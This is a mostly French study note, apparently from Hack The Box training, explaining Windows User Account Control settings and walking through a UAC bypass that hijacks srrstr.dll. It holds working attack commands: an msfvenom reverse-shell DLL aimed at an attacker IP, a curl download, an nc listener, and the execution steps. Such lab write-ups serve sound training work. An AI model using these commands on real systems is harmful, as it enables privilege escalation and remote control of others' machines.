# User Account Control

***

{% hint style="info" %}
<mark style="color:green;">**🔒 1. Définition du UAC (User Account Control)**</mark>

* Le **Contrôle de compte utilisateur (UAC)** est une fonctionnalité de Windows qui affiche une **invite de consentement** (popup) lorsqu’une action nécessite des **droits élevés** (administrateur).
* Son but est de limiter l’exécution de tâches critiques sans **confirmation explicite** de l’utilisateur.

***

<mark style="color:green;">**🏗️ 2. Niveaux d’intégrité des applications**</mark>

* Les applications Windows s’exécutent avec des **niveaux d'intégrité** différents :
  * **Bas**, **Moyen**, **Élevé**, **Système**.
* Une application avec un **niveau élevé** peut effectuer des opérations sensibles, voire **dangereuses** pour le système.
* Le UAC empêche ces programmes d’être exécutés avec un niveau élevé **sans autorisation**.

***

<mark style="color:green;">**👤 3. Exécution par défaut sans privilèges élevés**</mark>

* Lorsqu’UAC est activé :
  * Toutes les tâches et programmes sont exécutés **par défaut** dans le **contexte d’un utilisateur standard**,
  * Même si l’utilisateur est administrateur sur la machine.
* Ce n’est qu’après une **autorisation manuelle** que le programme peut s’exécuter avec des **droits administrateur**.

***

<mark style="color:green;">**🛡️ 4. Fonction utilitaire, pas barrière de sécurité**</mark>

* Le UAC est conçu pour **protéger les administrateurs contre les modifications accidentelles** du système.
* ⚠️ Ce **n’est pas une barrière de sécurité** au sens strict :
  * Il peut être contourné,
  * Il ne fournit pas de confinement ou de sandbox complet.

***

<mark style="color:green;">**👥 5. Utilisation typique pour un utilisateur standard**</mark>

* Un utilisateur peut **se connecter avec un compte standard** (non-admin).
* Les processus qu’il lance n’ont accès **qu’aux droits standards**.
* Si une application nécessite plus de droits :
  * Le UAC peut fournir un **jeton d’accès temporaire avec droits élevés** (après consentement de l’administrateur).

***

<mark style="color:green;">**🏛️ 6. Architecture, configuration et personnalisation du UAC**</mark>

* Le fonctionnement du UAC comprend :
  * Le **processus de connexion** utilisateur,
  * L’**expérience utilisateur** (la fameuse popup),
  * L’**architecture interne** (jetons d’accès, séparation de privilèges...).
* Les administrateurs peuvent configurer le UAC de deux façons :
  * **Localement** via `secpol.msc` (stratégie de sécurité locale),
  * **À distance**, via des **objets de stratégie de groupe (GPO)** dans un domaine Active Directory.

***

<mark style="color:green;">**🛠️ 7. Paramètres de stratégie disponibles**</mark>

* Il existe **10 paramètres de stratégie** dans Windows permettant de **personnaliser le comportement du UAC**.
* Ces paramètres peuvent être utilisés pour :
  * Modifier l’affichage de la boîte UAC,
  * Choisir qui doit entrer un mot de passe,
  * Définir les types de comptes affectés,
  * Etc.

***

1. ✅ **L’UAC doit être activé** :
   * Même s’il **n’empêche pas totalement un attaquant** de s’élever en privilèges,
   * Il **ralentit** le processus et oblige l’attaquant à être **plus bruyant** (plus facilement détectable).

***

2. 👤 **Le compte Administrateur par défaut (RID 500)** :
   * Ce compte spécial fonctionne toujours avec un **niveau d’intégrité élevé** (`High Mandatory Level`).
   * Il n’est **pas soumis** au filtrage standard de l’UAC (sauf si configuré manuellement via `FilterAdministratorToken`).

***

3. 🧑‍💼 **Comportement des nouveaux comptes administrateurs avec l’UAC** :
   * Quand le **mode d’approbation administrateur (Admin Approval Mode, AAM)** est activé :
     * Les comptes administrateurs **créés par l’utilisateur** fonctionnent **par défaut au niveau d’intégrité moyen** (`Medium Mandatory Level`),
     * Ils reçoivent **deux jetons d’accès** (access tokens) à la connexion :
       * Un jeton **standard** (non privilégié) utilisé par défaut,
       * Un jeton **élevé** (admin), utilisé **uniquement avec consentement via l’UAC**.

***

4. 💻 **Exemple concret** :
   * L’utilisateur **Sarah** fait partie du groupe **Administrateurs**.
   * Elle lance `cmd.exe`, mais :
     * Comme elle ne l’a pas lancé avec élévation (`Run as administrator`),
     * **La console s’exécute avec son jeton standard**, donc **sans privilèges administratifs**.

***
{% endhint %}

{% hint style="warning" %}
This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discusses how UAC works in great depth and includes the logon process, user experience, and UAC architecture. Administrators can use security policies to configure how UAC works specific to their organization at the local level (using secpol.msc), or configured and pushed out via Group Policy Objects (GPO) in an Active Directory domain environment. The various settings are discussed in detail [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings).&#x20;
{% endhint %}

There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail:

{% hint style="warning" %}
<mark style="color:green;">**Résumé des paramètres UAC (Group Policy Settings)**</mark>&#x20;

1. **Admin Approval Mode pour le compte Administrateur intégré**
   * 🔧 Clé : `FilterAdministratorToken`
   * 📌 Par défaut : **Désactivé**
   * ➤ Le compte `Administrator` **n’est pas soumis à l’UAC** par défaut (exécute tout en élevé).

***

2. **Autoriser les applications UIAccess à demander l’élévation sans desktop sécurisé**
   * 🔧 Clé : `EnableUIADesktopToggle`
   * 📌 Par défaut : **Désactivé**
   * ➤ Bloque les élévations de privilèges **hors du bureau sécurisé** pour les apps UIAccess.

***

3. **Comportement de l’invite d’élévation pour les administrateurs**
   * 🔧 Clé : `ConsentPromptBehaviorAdmin`
   * 📌 Par défaut : **Demander un consentement pour les binaires non-Windows**
   * ➤ Moins intrusif pour les apps Microsoft, mais demande confirmation pour les apps tierces.

***

4. **Comportement de l’invite d’élévation pour les utilisateurs standards**
   * 🔧 Clé : `ConsentPromptBehaviorUser`
   * 📌 Par défaut : **Demande les identifiants sur le bureau sécurisé**
   * ➤ Nécessite un **mot de passe admin** pour exécuter des tâches élevées.

***

5. **Détecter les installations d'applications et demander une élévation**
   * 🔧 Clé : `EnableInstallerDetection`
   * 📌 Par défaut : **Activé (Home)** / **Désactivé (Enterprise)**
   * ➤ Windows détecte automatiquement les installeurs et déclenche UAC.

***

6. **N’élever que les exécutables signés et validés**
   * 🔧 Clé : `ValidateAdminCodeSignatures`
   * 📌 Par défaut : **Désactivé**
   * ➤ Autorise aussi les exécutables non signés à s’élever (⚠️ moins sécurisé).

***

7. **Élever uniquement les apps UIAccess installées dans des emplacements sécurisés**
   * 🔧 Clé : `EnableSecureUIAPaths`
   * 📌 Par défaut : **Activé**
   * ➤ Bloque les UIAccess installées ailleurs que dans `Program Files` ou `Windows`.

***

8. **Exécuter tous les administrateurs en Admin Approval Mode**
   * 🔧 Clé : `EnableLUA`
   * 📌 Par défaut : **Activé**
   * ➤ Active **l’UAC globalement** pour tous les comptes admin. (⚠️ Le désactiver désactive UAC entièrement.)

***

9. **Basculer vers le bureau sécurisé pour les demandes d’élévation**
   * 🔧 Clé : `PromptOnSecureDesktop`
   * 📌 Par défaut : **Activé**
   * ➤ Empêche les logiciels malveillants d’interagir avec la boîte UAC (via un bureau isolé).

***

10. **Virtualiser les échecs d’écriture dans fichiers/registre vers des emplacements utilisateur**
11. 🔧 Clé : `EnableVirtualization`
12. 📌 Par défaut : (souvent activé)
13. ➤ Permet aux anciennes apps de fonctionner sans droits admin en **redirigeant les écritures système** vers un dossier utilisateur.
{% endhint %}

[Source](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings)

<figure><img src="../../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

<mark style="color:green;">**Checking Current User**</mark>

```cmd-session
C:\htb> whoami /user
```

<mark style="color:green;">**Confirming Admin Group Membership**</mark>

```cmd-session
C:\htb> net localgroup administrators
```

<mark style="color:green;">**Reviewing User Privileges**</mark>

```cmd-session
C:\htb> whoami /priv
```

<mark style="color:green;">**Confirming UAC is Enabled**</mark>

{% code fullWidth="true" %}
```cmd-session
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```
{% endcode %}

<mark style="color:green;">**Checking UAC Level**</mark>

{% code fullWidth="true" %}
```cmd-session
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
{% endcode %}

The value of `ConsentPromptBehaviorAdmin` is `0x5`, which means the highest UAC level of `Always notify` is enabled. There are fewer UAC bypasses at this highest level.

<mark style="color:green;">**Checking Windows Version**</mark>

```powershell-session
PS C:\htb> [environment]::OSVersion.Version
```

This returns the build version 14393, which using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page we cross-reference to Windows release `1607`.

<figure><img src="../../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
The [UACME](https://github.com/hfiref0x/UACME) project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it. Let's use technique number 54, which is stated to work from Windows 10 build 14393. This technique targets the 32-bit version of the auto-elevating binary `SystemPropertiesAdvanced.exe`. There are many trusted binaries that Windows will allow to auto-elevate without the need for a UAC consent prompt.

According to [this](https://egre55.github.io/system-properties-uac-bypass) blog post, the 32-bit version of `SystemPropertiesAdvanced.exe` attempts to load the non-existent DLL srrstr.dll, which is used by System Restore functionality.
{% endhint %}

{% hint style="warning" %}
<mark style="color:green;">💡</mark> <mark style="color:green;"></mark><mark style="color:green;">**Technique #54 – Contournement sur Windows 10 (build 14393 et plus)**</mark>

*   Cette technique cible l’exécutable :

    ```
    SystemPropertiesAdvanced.exe
    ```
* C’est un **binaire signé Microsoft** (trusted binary) qui peut être **auto-élevé sans demander de confirmation UAC**.
* Elle fonctionne sur la **version 32 bits** de cet exécutable, pas la 64 bits.

***

🧬 **Principe de l’attaque (DLL Hijacking)**

* Lorsqu’on exécute `SystemPropertiesAdvanced.exe` (en 32 bits), il essaie de charger une **DLL nommée `srrstr.dll`**.
* Problème : cette DLL **n’existe pas** par défaut sur le système.
* Du coup, **Windows la cherche dans plusieurs répertoires**, en suivant un ordre précis :

***

📚 **Ordre de recherche des DLLs par Windows :**

1. 📁 Le dossier où se trouve l’exécutable (ici : là où est `SystemPropertiesAdvanced.exe`)
2. 📂 Le répertoire système : `C:\Windows\System32` _(pour les systèmes 64 bits)_
3. 📂 Le répertoire 16 bits : `C:\Windows\System` _(non supporté en 64 bits)_
4. 🪟 Le répertoire Windows : `C:\Windows`
5. 🧩 Tous les dossiers listés dans la variable d’environnement `PATH`

***

🎯 **But de l’attaquant**

* Placer une **fausse DLL nommée `srrstr.dll`** dans l’un des dossiers en haut de la liste de recherche (idéalement : même dossier que l'exécutable).
* Ensuite, lancer `SystemPropertiesAdvanced.exe` :
  * ✅ Windows charge la DLL malveillante,
  * ✅ Comme c’est un **binaire auto-élevant**, la DLL s’exécute **avec les droits administrateur**,
  * ⚠️ **Sans afficher de prompt UAC**.

***

🛡️ **Note de sécurité**

* Ce genre de technique est appelé **"auto-elevating trusted binary DLL hijacking"**.
* Elle repose sur :
  * Un **binaire signé** Microsoft qui **ne demande pas de confirmation UAC**,
  * Une **faille de chargement dynamique (DLL search order hijacking)**.

***
{% endhint %}

<mark style="color:green;">**Reviewing Path Variable**</mark>

```powershell-session
PS C:\htb> cmd /c echo %PATH%

C:\Windows\system32;
C:\Windows;
C:\Windows\System32\Wbem;
C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
```

We can potentially bypass UAC in this by using DLL hijacking by placing a malicious `srrstr.dll` DLL to `WindowsApps` folder, which will be loaded in an elevated context.

```nb
[SystemPropertiesAdvanced.exe] 
        |
        ├── Cherche srrstr.dll dans son dossier → ❌
        ├── Cherche dans C:\Windows\System32 → ❌
        ├── Cherche dans C:\Windows → ❌
        └── Cherche dans %PATH% (WindowsApps est là) → ✅ ✔️
                  └── Charge ta DLL malveillante

```

<mark style="color:green;">**Generating Malicious srrstr.dll DLL**</mark>

{% code fullWidth="true" %}
```sh
mrroboteLiot_1@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```
{% endcode %}

<mark style="color:green;">**Starting Python HTTP Server on Attack Host**</mark>

```shell-session
mrroboteLiot_1@htb[/htb]$ sudo python3 -m http.server 8080
```

<mark style="color:green;">**Downloading DLL Target**</mark>

{% code fullWidth="true" %}
```powershell-session
PS C:\htb>curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```
{% endcode %}

<mark style="color:green;">**Starting nc Listener on Attack Host**</mark>

```shell-session
mrroboteLiot_1@htb[/htb]$ nc -lvnp 8443
```

<mark style="color:green;">**Testing Connection**</mark>

{% code fullWidth="true" %}
```cmd-session
C:\htb> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```
{% endcode %}

Once we get a connection back, we'll see normal user rights.

```shell-session
mrroboteLiot_1@htb[/htb]$ nc -lnvp 8443

C:\Users\sarah> whoami /priv

whoami /priv
```

<mark style="color:green;">**Executing SystemPropertiesAdvanced.exe on Target Host**</mark>

Before proceeding, we should ensure that any instances of the `rundll32` process from our previous execution have been terminated.

```cmd
C:\htb> tasklist /svc | findstr "rundll32"
rundll32.exe                  6300 N/A
rundll32.exe                  5360 N/A
rundll32.exe                  7044 N/A

C:\htb> taskkill /PID 7044 /F
SUCCESS: The process with PID 7044 has been terminated.

C:\htb> taskkill /PID 6300 /F
SUCCESS: The process with PID 6300 has been terminated.

C:\htb> taskkill /PID 5360 /F
SUCCESS: The process with PID 5360 has been terminated.
```

Now, we can try the 32-bit version of `SystemPropertiesAdvanced.exe` from the target host.

```cmd
C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

<mark style="color:green;">**Receiving Connection Back**</mark>

```shell-session
mrroboteLiot_1@htb[/htb]$ nc -lvnp 8443
```
